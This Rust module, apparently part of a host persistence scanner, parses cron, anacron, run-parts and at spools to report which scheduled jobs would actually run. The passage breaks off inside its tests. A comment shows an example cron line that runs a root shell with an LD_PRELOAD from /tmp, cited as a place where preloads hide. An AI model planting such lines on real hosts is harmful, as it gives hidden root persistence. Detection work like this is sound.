//! cron and at.
//!
//! Six spool layouts feed two kinds. Three parsing decisions here are easy to
//! get subtly wrong and are commented where they are made: what makes a line
//! an environment assignment rather than a job, where a command ends, and how
//! a line is named so that inserting a line above it does not re-identify it.

use std::collections::BTreeMap;
use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};

use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, name_from_os};
use crate::scan::{Collector, Ctx};

pub struct Cron;

impl Collector for Cron {
    fn name(&self) -> &'static str {
        "cron"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = Vec::new();
        let mut seen = Vec::new();
        let flavour = flavour(cx);

        let system = out.len();
        crontab(cx, Path::new("etc/crontab"), Layout::SystemWide, &mut out);
        for ent in cx.dir("etc/cron.d") {
            let rel = Path::new("etc/cron.d").join(&ent.name);
            let first = out.len();
            crontab(cx, &rel, Layout::SystemWide, &mut out);
            if let Some(why) = cron_d_skips(flavour, ent.name.as_bytes()) {
                for e in &mut out[first..] {
                    if e.enabled == Enablement::Enabled {
                        e.enabled = Enablement::Disabled;
                        e.note("not_run", why);
                    }
                }
            }
        }
        if flavour == Flavour::BusyBox {
            // BusyBox's crond opens its crontab directory and nothing else;
            // a system crontab on such a host is a file no daemon reads.
            for e in &mut out[system..] {
                if e.enabled == Enablement::Enabled {
                    e.enabled = Enablement::Disabled;
                    e.note("not_run", "BusyBox crond reads only its crontab directory");
                }
            }
        }

        match flavour {
            Flavour::Debian | Flavour::Cronie | Flavour::Unknown => {
                for dir in ["var/spool/cron", "var/spool/cron/crontabs"] {
                    if !first_visit(cx, dir, &mut seen) {
                        continue;
                    }
                    for ent in cx.dir(dir) {
                        // The crontabs/ and atjobs/ spools live inside var/spool/cron.
                        if ent.is_dir {
                            continue;
                        }
                        let rel = Path::new(dir).join(&ent.name);
                        let user = ent.name.to_string_lossy().into_owned();
                        crontab(cx, &rel, Layout::ForUser(&user), &mut out);
                    }
                }
            }
            Flavour::BusyBox => {
                for dir in busybox_crontab_dirs(cx) {
                    if !first_visit(cx, &dir, &mut seen) {
                        continue;
                    }
                    let mut names: Vec<_> = cx.dir(&dir).into_iter().filter(|e| !e.is_dir).map(|e| e.name).collect();
                    names.sort();
                    for name in names {
                        let rel = Path::new(&dir).join(&name);
                        let user = name.to_string_lossy().into_owned();
                        busybox_crontab(cx, &rel, &user, &mut out);
                    }
                }
            }
        }

        anacrontab(cx, &mut out);
        // After every job that could name a directory has been read. The
        // run-parts binary is read once, and every directory below is judged
        // by it.
        let run_parts_flavour = super::run_parts_flavour(cx);
        for period in ["hourly", "daily", "weekly", "monthly"] {
            run_parts(cx, run_parts_flavour, period, &mut out);
        }
        periodic(cx, run_parts_flavour, &mut out);

        for dir in ["var/spool/cron/atjobs", "var/spool/at"] {
            if !first_visit(cx, dir, &mut seen) {
                continue;
            }
            for ent in cx.dir(dir) {
                // .SEQ and its friends are atd's own bookkeeping, not jobs.
                if ent.is_dir || ent.name.as_bytes().starts_with(b".") {
                    continue;
                }
                let rel = Path::new(dir).join(&ent.name);
                at_job(cx, &rel, &ent.name, &mut out);
            }
        }

        out
    }
}

/// Which cron a host has, from what its crond is. BusyBox's reads one
/// directory by its own rule; the others read the Vixie layout, Debian's cron
/// and Fedora's cronie each with its own rule for what /etc/cron.d may hold.
#[derive(Clone, Copy, PartialEq, Debug)]
enum Flavour {
    /// Debian's cron.
    Debian,
    /// cronie, Fedora's.
    Cronie,
    BusyBox,
    /// No daemon found to say which.
    Unknown,
}

/// Why the daemon does not read a file of this name from /etc/cron.d, if it
/// does not. Each is what the daemon was seen to do: files named as below
/// were dropped in /etc/cron.d, each with a job touching a file of its own,
/// and the daemon run to see which touched theirs.
fn cron_d_skips(flavour: Flavour, name: &[u8]) -> Option<&'static str> {
    match flavour {
        // Only what run-parts would run: letters, digits, `_` and `-`.
        Flavour::Debian if name.is_empty() || !name.iter().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-')) => {
            Some("Debian's cron reads only names of letters, digits, _ and - from /etc/cron.d")
        }
        Flavour::Cronie
            if name.first().is_some_and(|b| matches!(b, b'.' | b'#'))
                || [&b"~"[..], b".rpmsave", b".rpmorig", b".rpmnew"].iter().any(|suffix| name.ends_with(suffix)) =>
        {
            Some("cronie skips a name that starts with . or #, or ends in ~, .rpmsave, .rpmorig or .rpmnew")
        }
        _ => None,
    }
}

/// The daemon binaries, in the order a host would have them: /usr/sbin/crond
/// is BusyBox's link on Alpine and cronie's on Fedora, /usr/sbin/cron is
/// Debian's. Read whole rather than through the collector's capped reads: a
/// binary is not configuration, and a read of it that hit its cap is not a
/// limited read of anything the operator should hear about.
fn flavour(cx: &mut Ctx) -> Flavour {
    for p in ["usr/sbin/crond", "sbin/crond", "usr/sbin/cron", "usr/bin/crond"] {
        let Ok(resolved) = cx.root.resolve(Path::new(p)) else { continue };
        let Ok((bytes, _)) = cx.root.read_capped(&resolved, 16 << 20) else { continue };
        return if bytes.windows(7).any(|w| w == b"BusyBox") {
            Flavour::BusyBox
        } else if p.ends_with("/cron") {
            Flavour::Debian
        } else {
            Flavour::Cronie
        };
    }
    Flavour::Unknown
}

/// BusyBox crond's crontab directory: /var/spool/cron/crontabs unless its
/// service passes `-c`, which Alpine's does through CRON_OPTS in
/// /etc/conf.d/crond (to /etc/crontabs, the same directory by another name;
/// the first spelling read is the one apk records).
fn busybox_crontab_dirs(cx: &mut Ctx) -> Vec<String> {
    let mut dirs = Vec::new();
    if let Some(bytes) = cx.read("etc/conf.d/crond") {
        for line in bytes.split(|b| *b == b'\n') {
            let Some(value) = trim(line).strip_prefix(b"CRON_OPTS=") else { continue };
            let words: Vec<&[u8]> = unquote(value).split(|b| b.is_ascii_whitespace()).filter(|w| !w.is_empty()).collect();
            for (i, w) in words.iter().enumerate() {
                let dir = match w.strip_prefix(b"-c") {
                    Some(rest) if !rest.is_empty() => Some(rest),
                    Some(_) => words.get(i + 1).copied(),
                    None => None,
                };
                if let Some(d) = dir {
                    dirs.push(String::from_utf8_lossy(d).trim_start_matches('/').to_string());
                }
            }
        }
    }
    dirs.push("var/spool/cron/crontabs".to_string());
    dirs
}

/// One user's crontab as BusyBox crond loads it (crond.c). The file is read
/// only if it is named for an account in passwd and owned by root; root's
/// first 65534 lines and anyone else's first 255, comments and blanks not
/// counted. Lines come through config_read: a trailing backslash joins the
/// next line, leading blanks go, a line starting with # is skipped, a #
/// anywhere else ends the line, and runs of blanks split up to six tokens
/// with the sixth taking the rest. `MAILTO=`, `SHELL=` and `PATH=` on the
/// first token are settings, the value being that token alone; an @ line
/// names one of crond's seven periods or reboot, and its command is the
/// original line after its first word, # and all; anything else needs six
/// tokens or is skipped. The command goes to `$SHELL -c`; there is no %.
fn busybox_crontab(cx: &mut Ctx, rel: &Path, user: &str, out: &mut Vec<Entry>) {
    if is_symlink(cx, rel) {
        out.push(unparsed_link(cx, Kind::Cron, rel, Some(user.to_string())));
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let crlf = has_crlf(&bytes);
    let not_run: Option<String> = if !cx.users.iter().any(|u| u.name == user && u.source == "passwd") {
        Some(format!("crond ignores a crontab named for no account ({user})"))
    } else {
        match cx.root.stat(rel) {
            Ok(m) if m.uid != 0 => Some(format!("crond loads only files owned by root; this one is owned by uid {}", m.uid)),
            _ => None,
        }
    };
    let limit = if user == "root" { 65534 } else { 255 };
    let mut env: BTreeMap<String, String> = BTreeMap::new();
    let mut used = BTreeMap::new();
    let mut loaded = 0usize;
    for line in super::inittab::continued_lines(&bytes) {
        let Some((tokens, original)) = busybox_tokens(&line) else { continue };
        loaded += 1;
        let past_limit = loaded > limit;
        for key in ["MAILTO", "SHELL", "PATH"] {
            if let Some(v) = tokens[0].strip_prefix(format!("{key}=").as_bytes()) {
                env.insert(key.to_string(), String::from_utf8_lossy(v).into_owned());
            }
        }
        if [b"MAILTO=".as_slice(), b"SHELL=", b"PATH="].iter().any(|k| tokens[0].starts_with(k)) {
            continue;
        }
        let mut e = if tokens[0][0] == b'@' {
            let command = take_fields(original, 1).map(|(_, rest)| trim_start(rest)).unwrap_or(b"");
            match (shortcut(tokens[0]), tokens.len() >= 2) {
                (Some(trigger), true) => job(cx, rel, user, tokens[0], command, trigger, &mut used),
                _ => {
                    let mut e = malformed(cx, rel, original, Some(user.to_string()), &mut used);
                    e.note("parse_error", "crond knows @reboot, @yearly, @annually, @monthly, @weekly, @daily, @midnight and @hourly, each with a command");
                    e
                }
            }
        } else if tokens.len() < 6 {
            let mut e = malformed(cx, rel, original, Some(user.to_string()), &mut used);
            e.note("parse_error", "fewer than six fields; crond skips the line");
            e
        } else {
            let schedule = tokens[..5].join(&b' ');
            let mut e = job(cx, rel, user, &schedule, tokens[5], Trigger::Schedule, &mut used);
            if let Some(bad) = odd_field(&schedule) {
                e.note("schedule_suspect", String::from_utf8_lossy(bad));
            }
            e
        };
        for (k, v) in &env {
            e.raw.entry(format!("env.{k}")).or_insert_with(|| v.clone());
        }
        e.note("crond", "busybox");
        if crlf {
            e.note("line_ending", "crlf");
        }
        if let Some(why) = &not_run {
            e.enabled = Enablement::Disabled;
            e.note("not_run", why.clone());
        } else if past_limit {
            e.enabled = Enablement::Disabled;
            e.note("not_run", format!("past crond's limit of {limit} lines for this file"));
        }
        out.push(e);
    }
}

/// A job line as an entry, named from its schedule and command like every
/// other crontab line.
fn job(cx: &mut Ctx, rel: &Path, user: &str, schedule: &[u8], command: &[u8], trigger: Trigger, used: &mut BTreeMap<String, u32>) -> Entry {
    let (name, dup) = unique(used, job_name(schedule, command));
    let mut e = cx.entry(Kind::Cron, rel, &name);
    if dup > 1 {
        e.note("duplicate_line", dup.to_string());
    }
    e.trigger = trigger;
    e.enabled = Enablement::Enabled;
    e.principal = Some(user.to_string());
    e.note("schedule", String::from_utf8_lossy(schedule));
    set_command(&mut e, command);
    e.target_path = command_target(command, &mut e);
    e
}

/// config_read with `# \t`: the tokens of one logical line and the line as
/// crond keeps a copy of it, or nothing for a blank or comment line.
fn busybox_tokens(line: &[u8]) -> Option<(Vec<&[u8]>, &[u8])> {
    let blank = |b: &u8| *b == b' ' || *b == b'\t';
    let start = line.iter().position(|b| !blank(b)).unwrap_or(line.len());
    let line = &line[start..];
    if line.is_empty() || line[0] == b'#' {
        return None;
    }
    let mut tokens: Vec<&[u8]> = Vec::new();
    let mut rest = line;
    loop {
        if tokens.len() < 5 {
            let i = rest.iter().position(|b| *b == b'#' || blank(b)).unwrap_or(rest.len());
            tokens.push(&rest[..i]);
            if i < rest.len() && rest[i] == b'#' {
                rest = &[];
            } else {
                rest = &rest[i.min(rest.len())..];
                let skip = rest.iter().position(|b| !blank(b)).unwrap_or(rest.len());
                rest = &rest[skip..];
            }
        } else {
            let i = rest.iter().position(|b| *b == b'#').unwrap_or(rest.len());
            let end = rest[..i].iter().rposition(|b| !blank(b)).map_or(0, |j| j + 1);
            tokens.push(&rest[..end]);
            rest = &[];
        }
        if rest.is_empty() || rest[0] == b'#' || tokens.len() >= 6 {
            break;
        }
    }
    Some((tokens, line))
}

/// /etc/periodic/{15min,hourly,daily,weekly,monthly}: Alpine's run-parts
/// directories, which crond runs only because root's packaged crontab says
/// `run-parts /etc/periodic/<period>` on that schedule.
fn periodic(cx: &mut Ctx, flavour: super::RunParts, out: &mut Vec<Entry>) {
    for period in ["15min", "hourly", "daily", "weekly", "monthly"] {
        run_parts_scripts(cx, flavour, &format!("etc/periodic/{period}"), period, out);
    }
}

/// /etc/cron.{hourly,daily,weekly,monthly}. These are scripts run by
/// run-parts, not crontab lines: there is no command to parse, the script
/// itself is the target, and the schedule comes from the directory.
fn run_parts(cx: &mut Ctx, flavour: super::RunParts, period: &str, out: &mut Vec<Entry>) {
    run_parts_scripts(cx, flavour, &format!("etc/cron.{period}"), period, out);
}

/// The scripts of one run-parts directory. Each is a cron entry, on when
/// run-parts would run it and a loaded crontab or anacron job names its
/// directory: nothing but such a job ever points run-parts at it, so a
/// directory no job names is scripts nobody runs, however executable.
fn run_parts_scripts(cx: &mut Ctx, flavour: super::RunParts, dir: &str, period: &str, out: &mut Vec<Entry>) {
    let files = super::run_parts_dir(cx, flavour, Path::new(dir));
    if files.is_empty() {
        return;
    }
    // The directory as a job names it: by its path on the host, whatever root
    // the scan reads it through.
    let named = format!("/{dir}");
    let runner = out
        .iter()
        .find(|e| {
            e.kind == Kind::Cron
                && e.enabled == Enablement::Enabled
                && e.command.as_deref().is_some_and(|c| {
                    c.windows(9).any(|w| w == b"run-parts") && c.windows(named.len()).any(|w| w == named.as_bytes())
                })
        })
        .map(|e| e.source.display().to_string());
    for f in files {
        let mut e = cx.entry(Kind::Cron, &f.rel, f.name.to_string_lossy());
        name_from_os(&mut e, &f.name);
        e.trigger = Trigger::Schedule;
        e.principal = Some("root".to_string());
        e.target_path = Some(cx.root.abs(&f.rel));
        e.note("schedule", format!("@{period}"));
        e.enabled = Enablement::Enabled;
        if let Some(why) = f.not_run {
            e.enabled = Enablement::Disabled;
            e.note("not_run", why);
        }
        match &runner {
            Some(src) => e.note("run_by", format!("a crontab line in {src}")),
            None if e.enabled == Enablement::Enabled => {
                e.enabled = Enablement::Disabled;
                e.note("not_run", "no loaded crontab line runs run-parts on this directory");
            }
            None => {}
        }
        out.push(e);
    }
}

/// The two crontab layouts. The system files carry a user field between the
/// schedule and the command; a user's own spool file does not, and takes its
/// principal from the filename instead.
enum Layout<'a> {
    SystemWide,
    ForUser(&'a str),
}

impl Layout<'_> {
    fn principal(&self) -> Option<String> {
        match self {
            Layout::SystemWide => None,
            Layout::ForUser(u) => Some((*u).to_string()),
        }
    }
}

struct Job<'a> {
    schedule: &'a [u8],
    user: Option<&'a [u8]>,
    command: &'a [u8],
}

fn crontab(cx: &mut Ctx, rel: &Path, layout: Layout<'_>, out: &mut Vec<Entry>) {
    if is_symlink(cx, rel) {
        out.push(unparsed_link(cx, Kind::Cron, rel, layout.principal()));
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let crlf = has_crlf(&bytes);
    let mut env: BTreeMap<String, String> = BTreeMap::new();
    let mut used = BTreeMap::new();

    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if let Some((k, v)) = env_assignment(line) {
            env.insert(k, v);
            continue;
        }

        let mut e = match split_job(line, &layout) {
            Some(job) => {
                let (name, dup) = unique(&mut used, job_name(job.schedule, job.command));
                let mut e = cx.entry(Kind::Cron, rel, &name);
                if dup > 1 {
                    // Two byte-identical lines in one file derive the same
                    // name. They are still two jobs and need two ids.
                    e.note("duplicate_line", dup.to_string());
                }
                e.trigger = shortcut(job.schedule).unwrap_or(Trigger::Schedule);
                e.enabled = Enablement::Enabled;
                e.principal = match job.user {
                    Some(u) => Some(String::from_utf8_lossy(u).into_owned()),
                    None => layout.principal(),
                };
                e.note("schedule", String::from_utf8_lossy(job.schedule));
                if shortcut(job.schedule).is_none() {
                    if let Some(bad) = odd_field(job.schedule) {
                        e.note("schedule_suspect", String::from_utf8_lossy(bad));
                    }
                }
                let (command, stdin) = split_stdin(job.command);
                if let Some(s) = stdin {
                    e.note("stdin", String::from_utf8_lossy(s));
                }
                set_command(&mut e, command);
                e.target_path = command_target(command, &mut e);
                e
            }
            None => malformed(cx, rel, line, layout.principal(), &mut used),
        };

        // An assignment on the command line overrides the file-level one at
        // run time, so where both exist the inline value already set wins.
        for (k, v) in &env {
            e.raw.entry(format!("env.{k}")).or_insert_with(|| v.clone());
        }
        if crlf {
            e.note("line_ending", "crlf");
        }
        out.push(e);
    }
}

/// /etc/anacrontab: period, delay, job identifier, command. The identifier is
/// anacron's own name for the job and is already position-independent, so it
/// is the entry name — editing the command then diffs as Changed rather than
/// as a removal plus an addition.
fn anacrontab(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let rel = Path::new("etc/anacrontab");
    if is_symlink(cx, rel) {
        out.push(unparsed_link(cx, Kind::Cron, rel, Some("root".to_string())));
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let crlf = has_crlf(&bytes);
    let mut env: BTreeMap<String, String> = BTreeMap::new();
    let mut used = BTreeMap::new();

    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if let Some((k, v)) = env_assignment(line) {
            env.insert(k, v);
            continue;
        }

        let mut e = match anacron_job(line) {
            Some((period, delay, id, command)) => {
                let (name, dup) = unique(&mut used, String::from_utf8_lossy(id).into_owned());
                let mut e = cx.entry(Kind::Cron, rel, &name);
                if dup > 1 {
                    e.note("duplicate_job_identifier", dup.to_string());
                }
                e.trigger = Trigger::Schedule;
                e.enabled = Enablement::Enabled;
                e.principal = Some("root".to_string());
                e.note("schedule", String::from_utf8_lossy(period));
                e.note("delay_minutes", String::from_utf8_lossy(delay));
                set_command(&mut e, command);
                e.target_path = command_target(command, &mut e);
                e
            }
            None => malformed(cx, rel, line, Some("root".to_string()), &mut used),
        };

        for (k, v) in &env {
            e.raw.entry(format!("env.{k}")).or_insert_with(|| v.clone());
        }
        if crlf {
            e.note("line_ending", "crlf");
        }
        out.push(e);
    }
}

fn anacron_job(line: &[u8]) -> Option<(&[u8], &[u8], &[u8], &[u8])> {
    let (period, rest) = take_fields(line, 1)?;
    let (delay, rest) = take_fields(rest, 1)?;
    let (id, rest) = take_fields(rest, 1)?;
    let command = trim(rest);
    if command.is_empty() {
        return None;
    }
    Some((period, delay, id, command))
}

/// One at job. The spool file is a shell script with a generated preamble;
/// the body below it is what was submitted.
fn at_job(cx: &mut Ctx, rel: &Path, fname: &OsStr, out: &mut Vec<Entry>) {
    if is_symlink(cx, rel) {
        out.push(unparsed_link(cx, Kind::AtJob, rel, None));
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let (body_at, uid, env) = at_preamble(&bytes);

    let mut e = cx.entry(Kind::AtJob, rel, fname.to_string_lossy());
    name_from_os(&mut e, fname);
    e.trigger = Trigger::Schedule;
    e.enabled = Enablement::Enabled;

    // a0000101234567: queue letter, five hex digits of job number, eight hex
    // digits of the run time in minutes since the epoch.
    let n = fname.as_bytes();
    if n.len() >= 14 && n[0].is_ascii_alphabetic() && n[1..14].iter().all(u8::is_ascii_hexdigit) {
        e.note("queue", String::from_utf8_lossy(&n[..1]));
        e.note("job_number", String::from_utf8_lossy(&n[1..6]));
        if let Ok(minutes) = u64::from_str_radix(&String::from_utf8_lossy(&n[6..14]), 16) {
            e.note("run_at_unix", (minutes * 60).to_string());
        }
    } else {
        e.note("filename_unrecognised", "not the queue-letter, job-number, run-time form");
    }

    let uid = uid.unwrap_or(e.owner_uid);
    e.note("uid", uid.to_string());
    e.principal = Some(match cx.users.iter().find(|u| u.uid == Some(uid)) {
        Some(u) => u.name.clone(),
        None => uid.to_string(),
    });
    for (k, v) in env {
        e.note(&format!("env.{k}"), v);
    }

    let body = &bytes[body_at.min(bytes.len())..];
    if body.iter().all(|b| b.is_ascii_whitespace()) {
        e.note("parse_error", "no job body below the generated preamble");
    }
    set_command(&mut e, body);
    out.push(e);
}

/// at writes the submitting environment into the top of the job script: a
/// shebang, comments, `umask`, `NAME=value; export NAME` lines and a
/// `cd ... || { ... }` guard. Returns where that preamble ends, the uid atd
/// will run the job as, and the environment it carries — LD_PRELOAD included.
fn at_preamble(bytes: &[u8]) -> (usize, Option<u32>, BTreeMap<String, String>) {
    let mut env = BTreeMap::new();
    let mut uid = None;
    let mut at = 0;
    let mut in_guard = false;

    for line in bytes.split(|b| *b == b'\n') {
        let advance = line.len() + 1;
        let t = trim(line);
        if in_guard {
            at += advance;
            if t == b"}" {
                in_guard = false;
            }
            continue;
        }
        if t.is_empty() || t[0] == b'#' {
            if let Some(u) = uid_field(t) {
                uid = Some(u);
            }
        } else if t.starts_with(b"umask ") || t.starts_with(b"export ") {
            // preamble, nothing to record
        } else if t.starts_with(b"cd ") {
            in_guard = t.ends_with(b"{");
        } else if let Some((k, v)) = at_env(t) {
            env.insert(k, v);
        } else {
            break;
        }
        at += advance;
    }
    (at.min(bytes.len()), uid, env)
}

/// `NAME=value; export NAME`, as at writes it. The trailing export is part of
/// the generated form, not of the value.
fn at_env(line: &[u8]) -> Option<(String, String)> {
    let (name, raw) = assignment(line)?;
    let name = String::from_utf8_lossy(name).into_owned();
    let mut value = raw;
    let suffix = format!("; export {name}");
    if value.ends_with(suffix.as_bytes()) {
        value = &value[..value.len() - suffix.len()];
    }
    Some((name, String::from_utf8_lossy(unquote(value)).into_owned()))
}

fn uid_field(line: &[u8]) -> Option<u32> {
    let i = line.windows(4).position(|w| w == b"uid=")?;
    let rest = &line[i + 4..];
    let end = rest.iter().position(|b| !b.is_ascii_digit()).unwrap_or(rest.len());
    String::from_utf8_lossy(&rest[..end]).parse().ok()
}

/// Splits a crontab line into schedule, user and command, or reports that it
/// is not a job line at all.
fn split_job<'a>(line: &'a [u8], layout: &Layout<'_>) -> Option<Job<'a>> {
    // The @ shortcuts replace all five schedule fields with one token.
    let count = if line[0] == b'@' { 1 } else { 5 };
    let (schedule, rest) = take_fields(line, count)?;
    if count == 1 && shortcut(schedule).is_none() {
        return None;
    }
    let (user, rest) = match layout {
        Layout::SystemWide => {
            let (u, r) = take_fields(rest, 1)?;
            (Some(u), r)
        }
        Layout::ForUser(_) => (None, rest),
    };
    // Everything after the last field is the command, `#` and all.
    let command = trim_start(rest);
    if command.is_empty() {
        return None;
    }
    Some(Job { schedule, user, command })
}

fn shortcut(s: &[u8]) -> Option<Trigger> {
    match String::from_utf8_lossy(s).to_ascii_lowercase().as_str() {
        "@reboot" => Some(Trigger::Boot),
        "@yearly" | "@annually" | "@monthly" | "@weekly" | "@daily" | "@midnight" | "@hourly" => {
            Some(Trigger::Schedule)
        }
        _ => None,
    }
}

/// Cron fields are `*`, numbers, ranges, steps, lists and three-letter month
/// and day names. A field outside that character set will not load, which is
/// worth recording rather than asserting the job runs.
fn odd_field(schedule: &[u8]) -> Option<&[u8]> {
    schedule
        .split(|b: &u8| b.is_ascii_whitespace())
        .filter(|f| !f.is_empty())
        .find(|f| !f.iter().all(|b| b.is_ascii_alphanumeric() || b"*,-/~".contains(b)))
}

/// A `%` that is not backslash-escaped ends the command; what follows is the
/// job's standard input.
fn split_stdin(cmd: &[u8]) -> (&[u8], Option<&[u8]>) {
    let mut i = 0;
    while i < cmd.len() {
        match cmd[i] {
            b'\\' => i += 2,
            b'%' => return (&cmd[..i], Some(&cmd[i + 1..])),
            _ => i += 1,
        }
    }
    (cmd, None)
}

/// Leading `NAME=value` words belong to the command line, not to the program:
/// `* * * * * root LD_PRELOAD=/tmp/x /bin/sh` runs /bin/sh. The assignments
/// are recorded, since that is one of the places a preload hides.
fn command_target(cmd: &[u8], e: &mut Entry) -> Option<PathBuf> {
    let mut rest = cmd;
    while let Some((word, tail)) = take_fields(rest, 1) {
        if let Some((k, v)) = env_assignment(word) {
            e.note(&format!("env.{k}"), v);
            rest = tail;
            continue;
        }
        let word = super::shell_word(word);
        return word.starts_with(b"/").then(|| path(word));
    }
    None
}

/// Is this line an environment assignment rather than a job? cron's own rule:
/// read a name up to whitespace or `=`, allow whitespace, and require the `=`
/// next. `* * * * * FOO=bar cmd` fails it at the second `*` and stays a job.
fn env_assignment(line: &[u8]) -> Option<(String, String)> {
    let (name, value) = assignment(line)?;
    Some((
        String::from_utf8_lossy(name).into_owned(),
        String::from_utf8_lossy(unquote(value)).into_owned(),
    ))
}

fn assignment(line: &[u8]) -> Option<(&[u8], &[u8])> {
    let mut i = 0;
    while i < line.len() && !line[i].is_ascii_whitespace() && line[i] != b'=' {
        i += 1;
    }
    if i == 0 {
        return None;
    }
    let name = &line[..i];
    while i < line.len() && line[i].is_ascii_whitespace() {
        i += 1;
    }
    if line.get(i) != Some(&b'=') {
        return None;
    }
    i += 1;
    while i < line.len() && line[i].is_ascii_whitespace() {
        i += 1;
    }
    Some((name, &line[i..]))
}

fn unquote(v: &[u8]) -> &[u8] {
    match v {
        [q @ (b'"' | b'\''), inner @ .., last] if q == last => inner,
        _ => v,
    }
}

/// Position-independent identity (§4). The name is derived from what the job
/// *is* — its schedule and its command — never from where it sits in the
/// file, so inserting a line at the top of /etc/crontab does not re-identify
/// everything below it. Width is 96 bits: the name is hashed into the entry
/// id, and §4's arithmetic rules out anything narrower for a value that
/// decides whether two entries are the same entry.
fn job_name(schedule: &[u8], command: &[u8]) -> String {
    let mut h = blake3::Hasher::new();
    for part in [&normalise_ws(schedule)[..], command] {
        h.update(&(part.len() as u64).to_le_bytes());
        h.update(part);
    }
    let hex = h.finalize().to_hex();
    hex[..24].to_string()
}

/// Reformatting the whitespace between schedule fields does not change which
/// job a line is, so it must not change the name either.
fn normalise_ws(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    for f in s.split(|b: &u8| b.is_ascii_whitespace()).filter(|f| !f.is_empty()) {
        if !out.is_empty() {
            out.push(b' ');
        }
        out.extend_from_slice(f);
    }
    out
}

fn unique(used: &mut BTreeMap<String, u32>, base: String) -> (String, u32) {
    let n = used.entry(base.clone()).or_insert(0);
    *n += 1;
    if *n == 1 { (base, 1) } else { (format!("{base}-{n}"), *n) }
}

/// A line that parses as neither a job nor an assignment is still evidence:
/// it is reported with what it says and why it was not understood, rather
/// than dropped.
fn malformed(
    cx: &mut Ctx,
    rel: &Path,
    line: &[u8],
    principal: Option<String>,
    used: &mut BTreeMap<String, u32>,
) -> Entry {
    let (name, dup) = unique(used, job_name(b"", line));
    let mut e = cx.entry(Kind::Cron, rel, &name);
    if dup > 1 {
        e.note("duplicate_line", dup.to_string());
    }
    e.trigger = Trigger::Schedule;
    e.enabled = Enablement::Unknown;
    e.principal = principal;
    e.note("parse_error", "neither a job line nor an environment assignment");
    set_command(&mut e, line);
    e
}

/// Reading through a link in a spool would paste whatever it points at — the
/// shadow file is the classic — into the report as if it were cron syntax.
/// The link is evidence; its target's contents are not ours to read.
fn unparsed_link(cx: &mut Ctx, kind: Kind, rel: &Path, principal: Option<String>) -> Entry {
    let name = rel.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let mut e = cx.entry(kind, rel, name);
    e.trigger = Trigger::Schedule;
    e.enabled = Enablement::Unknown;
    e.principal = principal;
    e.note("parse_error", "source is a symlink; its target was not read");
    e
}

pub(crate) fn set_command(e: &mut Entry, bytes: &[u8]) {
    if std::str::from_utf8(bytes).is_err() {
        e.flag(Flag::EncodingAnomaly);
    }
    if bytes.contains(&0) {
        e.note("command_nul", "true");
    }
    e.command = Some(bytes.to_vec());
}

fn is_symlink(cx: &Ctx, rel: &Path) -> bool {
    cx.root.stat(rel).map(|m| m.is_symlink).unwrap_or(false)
}

/// Two spool paths can be one directory — /var/spool/at is a link to the at
/// jobs spool on some layouts — and walking it twice would emit every job
/// twice under two source paths that never reconcile in a diff.
fn first_visit(cx: &Ctx, rel: &str, seen: &mut Vec<(u64, u64)>) -> bool {
    match cx.root.dir_identity(rel) {
        Ok(id) if seen.contains(&id) => false,
        Ok(id) => {
            seen.push(id);
            true
        }
        // Absent or unreadable; cx.dir records which.
        Err(_) => true,
    }
}

/// Splits `n` whitespace-separated fields off the front, returning the span
/// they cover and what follows them.
fn take_fields(s: &[u8], n: usize) -> Option<(&[u8], &[u8])> {
    let mut i = 0;
    while i < s.len() && s[i].is_ascii_whitespace() {
        i += 1;
    }
    let begin = i;
    let mut end = i;
    for _ in 0..n {
        while i < s.len() && s[i].is_ascii_whitespace() {
            i += 1;
        }
        let start = i;
        while i < s.len() && !s[i].is_ascii_whitespace() {
            i += 1;
        }
        if i == start {
            return None;
        }
        end = i;
    }
    Some((&s[begin..end], &s[i..]))
}

fn trim(s: &[u8]) -> &[u8] {
    let mut a = 0;
    let mut b = s.len();
    while a < b && s[a].is_ascii_whitespace() {
        a += 1;
    }
    while b > a && s[b - 1].is_ascii_whitespace() {
        b -= 1;
    }
    &s[a..b]
}

fn trim_start(s: &[u8]) -> &[u8] {
    let mut a = 0;
    while a < s.len() && s[a].is_ascii_whitespace() {
        a += 1;
    }
    &s[a..]
}

fn has_crlf(bytes: &[u8]) -> bool {
    bytes.windows(2).any(|w| w == b"\r\n")
}

fn path(bytes: &[u8]) -> PathBuf {
    PathBuf::from(OsStr::from_bytes(bytes).to_os_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status};
    use std::os::unix::fs::PermissionsExt;

    fn tree(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("unbidden-cron-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn put(dir: &Path, rel: &str, body: &[u8]) {
        let p = dir.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(&p, body).unwrap();
    }

    fn chmod(dir: &Path, rel: &str, mode: u32) {
        std::fs::set_permissions(dir.join(rel), PermissionsExt::from_mode(mode)).unwrap();
    }

    fn scan(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Cron)];
        crate::scan::run(&root, &Options { deep: false }, &collectors)
    }

    fn text(e: &Entry) -> String {
        String::from_utf8_lossy(e.command.as_deref().unwrap_or(b"")).into_owned()
    }

    fn find<'a>(s: &'a Scan, needle: &str) -> &'a Entry {
        s.entries.iter().find(|e| text(e).contains(needle)).unwrap_or_else(|| panic!("no entry whose command contains {needle:?}"))
    }

    fn named<'a>(s: &'a Scan, name: &str) -> &'a Entry {
